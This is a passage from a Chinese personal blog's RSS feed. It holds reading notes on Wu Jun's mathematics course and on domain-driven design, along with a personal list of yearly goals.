&lt;p&gt;具体内容因为太多了，一共50讲，大家可用自己去看，大概是分了7个模块，每个模块有一个主题思想，我觉得很重要，分别是：数学的线索-从猜想到定理的应用；数的概念-从具体到抽象；几何学-一切源自公理和逻辑；代数学-用数量描绘世界；微积分-动态的世界观；概率，统计，博弈论-从确定到不确定；数学的基础作用与其他学科的关系。基本上认为涵盖了从小学到大学的数学教育的精髓。其实这点我感触还是挺深的，这里不介绍具体内容，只介绍几个数学思维：&lt;/p&gt;

&lt;h4 id=&quot;一不轻易相信没有根据的结论一切要从公理出发用逻辑得到结论&quot;&gt;一、不轻易相信没有根据的结论，一切要从公理出发，用逻辑得到结论&lt;/h4&gt;

&lt;p&gt;数学是一个公理化的体系，这既是数学的特点，也是数学的方法。整个欧氏几何都构建在5条基本公理和5条几何公理之上的。&lt;/p&gt;

&lt;p&gt;​	1、两点之间有且仅有一条直线&lt;/p&gt;

&lt;p&gt;​	2、直线可以往两端无限延长&lt;/p&gt;

&lt;p&gt;​	3、以任意一点为圆心，任意长度为半径，可以画圆&lt;/p&gt;

&lt;p&gt;​	4、所有直角都相等&lt;/p&gt;

&lt;p&gt;​	5、过直线外一点，有且仅有一条平行线&lt;/p&gt;

&lt;p&gt;整个几何学就是建立在这些公理之上，他的发展依靠对新定理的发现和通过逻辑推理证明这些定理。比如通过这些公理可以证明对顶角相等，进而又可以证明同位角相等等等定理，后人可以站在前人的肩膀上继续工作，其实计算机也是一样的，计算机最底层只能做二进制的逻辑运算，然后通过逻辑运算可以做出加法器，乘法器，最终实现像我们看到的播放视频，处理图片这种高级效果。我们现在很少再去写二分查找，快速排序算法的实现也是一样，因为这些都固化到了底层实现里。我们需要做的更多的是关注这个世界已经发展到了什么阶段，有什么工具可以使用，我们要解决哪些实际问题，而这些实际问题可以通过哪些工具解决。比如昨天老贾分享的用flutter这个工具来解决跨平台移动开发的问题。&lt;/p&gt;

&lt;h4 id=&quot;二在解决问题之前先搞清楚问题特别是搞清楚问题的定义&quot;&gt;二、在解决问题之前，先搞清楚问题，特别是搞清楚问题的定义&lt;/h4&gt;

&lt;p&gt;这点的感触就更多了，我们程序员经常容易犯的一个毛病就是上来就想解决方案，陷入到无限的细节里面，而缺乏对问题的全面认识。比如我们要解决研发效能的问题，很容易一上来就想什么敏捷开发啊，自动化测试啊，持续集成啊，devops啊之类的方法，但比较少去向“研发效能”这四个字代表什么含义，是并行开发的需求多？是需求的响应速度快？还是加班时长比较长？就是我们应该用个什么指标体系去衡量他，可能更重要，大多数时候，搞清楚了问题的定义，基本也就知道怎么解决了。对应到我们系统的需求上也是同样的道理。&lt;/p&gt;

&lt;h4 id=&quot;三各种知识体系是相通的&quot;&gt;三、各种知识体系是相通的&lt;/h4&gt;

&lt;p&gt;他这里的讲的各种知识体系更多的是数学的各种分支，其实数学和其他自然科学也是相通的，甚至可以说数学是自然科学的基础。比如微积分就是牛顿用来解决物理问题而发明的数学工具，而电子计算机是图灵用来破解二战期间德国的密码而发明的工具。这也能一部分解释那些看起来某方面很厉害的人好多方面都挺厉害的。我们从牛逼的大学里校招那些学霸大概率写代码也不错的原因也是一样的。&lt;/p&gt;

&lt;h4 id=&quot;四用动态发展的眼光看世界&quot;&gt;四、用动态，发展的眼光看世界&lt;/h4&gt;

&lt;p&gt;这个吴军讲的是无穷大和无穷小这两个概念的时候降到的。讲数学概念的时候讲的很细致很精彩，抽象到这个高度之后反而觉得很鸡汤了。包括罗振宇的跨年演讲里去年提到的小趋势，今年提到的躬身入局，中国制造业的变化都有讲到这个思维。这个大家了解，我就不多说了。总共就是这4个数学思维。&lt;/p&gt;

&lt;p&gt;最后，我还想了一个问题：&lt;strong&gt;都说计算机是数学的一个分支，那我这个“搞计算机的”怎么完全没有感觉自己是个“搞数学的”？&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;1、我现在做的工作都是非常顶层的，主要是应用计算机来完成工作，而不是设计一个cpu指令集或者设计一种加密算法。&lt;/p&gt;

&lt;p&gt;2、我之前对数学有非常深的误解，甚至根本就没怎么摸到数学的门，以为数学就是加减乘除的考试。直到大数据，人工智能的兴起，数学才又走进了我的世界。做了风向标，才理解了平均值，中位数和方差这些很基本的概念；了解了一些AI的基本原理才了解了统计，概率这些不确定性才是我们这个世界的常态。非此即彼，非黑即白才是特殊情况。&lt;/p&gt;

&lt;p&gt;总之，我觉得吴军这个专栏非常不错，推荐大家可以去读一下。&lt;/p&gt;

</description>
        <pubDate>Tue, 07 Jan 2020 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2020/01/07/mathematics/</link>
        <guid isPermaLink="true">http://laichendong.com/2020/01/07/mathematics/</guid>
        
        <category>数学通识</category>
        
        <category>吴军</category>
        
        
        <category>读书笔记</category>
        
      </item>
    
      <item>
        <title>2019-flags</title>
        <description>&lt;h3 id=&quot;自我成长&quot;&gt;自我成长：&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 报考清华经管MBA
- 把自己变成AI人才，多写点代码？
- 看书：月均1本
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;提升生活情趣&quot;&gt;提升生活情趣：&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 品味：保持工位，家里的干净整洁和美感
- 画画：系统的学学素描，打型，多画
- 摄影：多拍
- 跑步：700/1000/1200   完成一次全马
- 游泳：学会踩水  2min以上
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;责任&quot;&gt;责任：&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 小孩教育：小天小学， 小月幼儿园
- 多陪家人
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;想给自己的礼物&quot;&gt;想给自己的礼物：&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- apple  Watch ： 4k
- 适马 24-70 2.8   8k
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Fri, 29 Nov 2019 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2019/11/29/2020-flags/</link>
        <guid isPermaLink="true">http://laichendong.com/2019/11/29/2020-flags/</guid>
        
        <category>OKR</category>
        
        
      </item>
    
      <item>
        <title>ddd</title>
        <description>&lt;p&gt;随着微服务和中台的兴起，领域驱动设计被越来越多的提起。&lt;/p&gt;

&lt;h2 id=&quot;设计与过程密不可分否则设计就是纸上谈兵&quot;&gt;&lt;strong&gt;设计与过程密不可分，否则设计就是纸上谈兵。&lt;/strong&gt;&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;系统的架构设计或者领域模型是动态的，是演化而来并且将继续演化的。不是静态设计出来的。所以要“每个月过一下架构图”。&lt;/li&gt;
  &lt;li&gt;面对一个新系统（新人入职，交接过来一个系统。。。）时，应该先了解他的演化过程，有些东西看起来一坨，可能并没有想象的那么糟糕，他还是切实的在解决业务问题，对一些老旧系统，谨慎的“推到重来”。这时候，系统里的“老人”会显得很重要，因为他们了解演化过程，也有比较深层次的领域知识。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;领域驱动设计的实质就是消化吸收大量知识最后产生一个反应深层次领域知识并聚焦于关键概念的模型&quot;&gt;&lt;strong&gt;领域驱动设计的实质，就是&lt;em&gt;消化吸收大量知识&lt;/em&gt;，最后产生一个反应&lt;em&gt;深层次领域知识&lt;/em&gt;并聚焦于&lt;em&gt;关键概念&lt;/em&gt;的&lt;em&gt;模型&lt;/em&gt;。&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;这里面有几个关键词。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;首先是&lt;strong&gt;消化知识&lt;/strong&gt;，这里指的知识说的是领域知识，或者说业务知识。比如“京东所有处罚商家的规定，首先至少要向所有商家公示7天以上才可以被执行，否则会有法律风险。”这就是奖惩领域的知识。&lt;/li&gt;
  &lt;li&gt;然后是&lt;strong&gt;关键概念&lt;/strong&gt;，根据刚刚消化得到的知识，我们会提取几个概念：条例=京东颁布的处罚商家的规定。公示期=条例已经被颁布但还不能被执行的时间区间。然后我们就用这些概念来组成我们的领域模型，也用这些概念来互相交流。&lt;/li&gt;
  &lt;li&gt;最后是模型，那模型是什么呢？&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;模型是一种简化它是对现实的解释&quot;&gt;&lt;strong&gt;模型是一种简化，它是对现实的解释。&lt;/strong&gt;&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;首先，&lt;strong&gt;现实是有无数面的&lt;/strong&gt;，我们观察到的永远是现实的某种解释，而不是现实本身。模&lt;strong&gt;型就是把与解决问题密切相关的方面抽象出来，而忽略无关的细节的那种解释&lt;/strong&gt;。比如，我们人类看到树是绿的，火是红的，但狗的眼睛构造与人不同，看不到这些光谱，它们看到的树是偏黄的，火是偏褐色的。那么问题来了，树和火到底是什么颜色？根本就不知道，甚至，颜色这个概念本身，也是一种模型，也是一种对现实的解释。&lt;/li&gt;
  &lt;li&gt;所以，&lt;strong&gt;领域模型，不是某种架构图&lt;/strong&gt;。而是图要传达出来的思想，也可以不用图，用文档表示，甚至可以用代码表示（极限编程XP推崇的就是——代码即文档）。&lt;/li&gt;
  &lt;li&gt;领域模型也不单单是领域专家（业务人员）头脑中的知识，只有大家共同认知到并且认可的知识才是领域模型。所以我们在实际工作中，一项非常难但非常重要的工作就是统一业务，产品，研发。。。所有参与人员对领域模型的认知。我理解，这也正是我们采用和推动领域驱动设计的一个重要原因。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;有效建模的要素&quot;&gt;有效建模的要素&lt;/h2&gt;

&lt;p&gt;那我们如何有效的建立我们的领域模型呢？&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;模型和实现的绑定&lt;/strong&gt;。就如第一点所说，我们设计的模型，一定要和代码实现绑定，别讨论的时候说的好像很有道理很完美，实现的时候又这里一个特殊逻辑那里一个实现不了。就成了所谓的PPT架构师了。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;建立了一种基于模型的语言&lt;/strong&gt;。我觉得这是最重要的要素没有之一。模型是团队所有成员使用的通用语言的中枢。只有当业产研都使用同一套语言来沟通的时候，效率才会高，摩擦才会少。&lt;/li&gt;
  &lt;li&gt;开发一个蕴含丰富知识的模型&lt;/li&gt;
  &lt;li&gt;提炼模型&lt;/li&gt;
  &lt;li&gt;头脑风暴和实验&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;不同的团队成员使用不同的术语而不自知&quot;&gt;不同的团队成员使用不同的术语而不自知&lt;/h2&gt;

&lt;p&gt;很多时候，业务使用业务的语言，产品使用产品的语言，研发使用研发的语言在讨论问题，讨论了半天也没结果，或者讨论出来了一个带有歧义的结果。甚至，同一个词，在不同语言里表达的概念完全不同，比如“中台”比如“组件化”。这个时候需要共事的团队使用同一种公共语言，然而任何一方的语言都不能成为公共语言。需要融合提炼一套公共语言。确保团队在内部是的所有交流，以及代码中坚持使用这种语言。在画图，写文档，写代码，特别是讲话时也要使用这种语言。&lt;/p&gt;

</description>
        <pubDate>Wed, 06 Nov 2019 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2019/11/06/ddd/</link>
        <guid isPermaLink="true">http://laichendong.com/2019/11/06/ddd/</guid>
        
        <category>领域驱动设计</category>
        
        <category>架构师</category>
        
        
        <category>读书笔记</category>
        
      </item>
    
  </channel>
</rss>
